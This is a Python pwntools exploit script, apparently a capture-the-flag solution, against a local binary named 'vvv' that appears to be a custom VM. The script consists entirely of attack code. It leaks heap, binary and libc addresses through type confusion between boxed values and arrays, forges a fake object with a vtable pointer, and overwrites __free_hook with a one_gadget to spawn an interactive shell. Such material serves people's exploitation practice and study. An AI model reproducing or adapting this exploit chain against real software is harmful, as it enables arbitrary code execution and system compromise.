from pwn import *

r = process("./vvv")

def CreateNativeArray(length):
    r.send("\x20")
    r.send(p32(0x10001000))
    r.send("\x17")
    r.send(p64(length))
    print r.recvuntil("]")

def CreateNativeIntArray(length):
    r.send("\x20")
    r.send(p32(0x10001000))
    r.send("\x20")
    r.send(p64(length))
    print r.recvuntil("]")

def CreateString(string):
    r.send("\x20")
    r.send(p32(0x20002000))
    r.sendline(string)

def SetIntBox(val):
    r.send("\x20")
    r.send(p32(val))
    print r.recvuntil("]")

def CreateBigNumber(val):
    r.send("\x20")
    r.send(p32(val))
    print r.recvuntil("]")

def Box2IntBox(idx, arrIdx):
    r.send("\x17")
    r.send("\x11")
    r.send(p64(idx))
    r.send(p64(arrIdx))

def IntBox2Box(boxIdx, IntBoxIdx, boxArrIdx):
    r.send("\x17")
    r.send("\x13")
    r.send(p64(boxIdx))
    r.send(p64(IntBoxIdx))
    r.send(p64(boxArrIdx))

def PrintBox(boxIdx):
    r.send("\x17")
    r.send("\x22")
    r.send(p64(boxIdx))
    print r.recv(1024)

def ArrayConcat(dest, src):
    r.send("\x17")
    r.send("\x33")
    r.send(p64(dest))
    r.send(p64(src))

def BigNumberOperation(destIdx, srcIdx, opType):
    r.send("\x17")
    r.send("\x77")
    r.send(p64(destIdx))
    r.send(p64(srcIdx))
    sleep(0.2)
    r.send(chr(opType))

CreateString("asdf")            # Box 0
CreateBigNumber(0x90000000)     # Box 1

BigNumberOperation(1, 0, 1)     # 0x90000000 += &"asdf"
PrintBox(1)                     # Leak heap addr

r.recvuntil("[")

heap = int(r.recvuntil("]")[:-1]) - 0x90000000
print "heap: " + hex(heap)

state = heap - 0x11e0

CreateNativeArray(5)                       # Box 2
CreateNativeIntArray(6)                    # Box 3

SetIntBox((state-0x10) & 0xffffffff)       # IntBox 0
SetIntBox((state-0x10) >> 32)              # IntBox 1

print "state: " + hex(state)

IntBox2Box(3, 0, 1) # Box3[1-1] = IntBox[0]
IntBox2Box(3, 1, 2) # Box3[2-1] = IntBox[1]

ArrayConcat(2, 3)                   # Box 4

Box2IntBox(4, 1) # Box4[1-1]

CreateBigNumber(0x90000000)         # Box 6

BigNumberOperation(6, 5, 1)         # 0x90000000 += state.vtbl
PrintBox(6)                         # Leak binary address

r.recvuntil("[")

binary = int(r.recvuntil("]")[:-1]) - 0x90000000 - 0x203ba8
free_got = binary + 0x204020

print "free_got: " + hex(free_got)

CreateNativeArray(5)               # Box 7
CreateNativeIntArray(6)            # Box 8

SetIntBox((free_got-0x10) & 0xffffffff)       # IntBox 2
SetIntBox((free_got-0x10) >> 32)              # IntBox 3

IntBox2Box(8, 2, 1)                # Box8[1-1] = IntBox[2]
IntBox2Box(8, 3, 2)                # Box8[2-1] = IntBox[1]

ArrayConcat(7, 8)                  # Box 9

CreateBigNumber(0x90000000)        # Box 10
Box2IntBox(9, 1)                   # Box9[1-1], Box 11

CreateBigNumber(0x90000000)        # Box 12

BigNumberOperation(12, 11, 1)      # 0x90000000 += free_got
PrintBox(12)                       # Leak libc address

r.recvuntil("[")

libc = int(r.recvuntil("]")[:-1]) - 0x90000000
libc_base = libc - 0x959988
free_hook = libc_base + 0x3c67a8
one_gadget = libc_base + 0xf1147

print "libc_base: " + hex(libc_base)

fake = "\x00\x00"
fake += p64(binary + 0x203bf8) # NativeIntArray vtable
fake += p32(0x10001000)
fake += p32(0x1)
fake += p64(0x7)
fake += p64(0x7)
fake += p64(free_hook)
fake += "\x00\x00"

for i in range(0, len(fake), 4):
    r.send("\x20")
    r.send(fake[i:i+4])
    rv = r.recvuntil("]")
    if (i == len(fake)-4) and "14" in rv:
        print "Success!"           # Create fake object
                                   # Until every 4byte < 0x80000000     
    print rv
    sleep(0.2)

fake_addr = state + 0x101a

CreateNativeArray(5)               # Box 13
CreateNativeIntArray(6)            # Box 14

SetIntBox((fake_addr) & 0xffffffff)       # IntBox 15
SetIntBox((fake_addr) >> 32)              # IntBox 16

IntBox2Box(14, 15, 1) 			   # Box14[1-1] = IntBox[15]
IntBox2Box(14, 16, 2) 			   # Box14[2-1] = IntBox[16]

ArrayConcat(13, 14)                # Box 15

Box2IntBox(15, 1)                  # Box15[1-1], Box 16

SetIntBox((one_gadget) & 0xffffffff) 	 # IntBox 17
SetIntBox((one_gadget) >> 32)        	 # IntBox 18

IntBox2Box(16, 17, 1) # free_hook = one_gadget
IntBox2Box(16, 18, 2)

raw_input("Spawn shell :)")
r.send("\x00")

r.interactive()
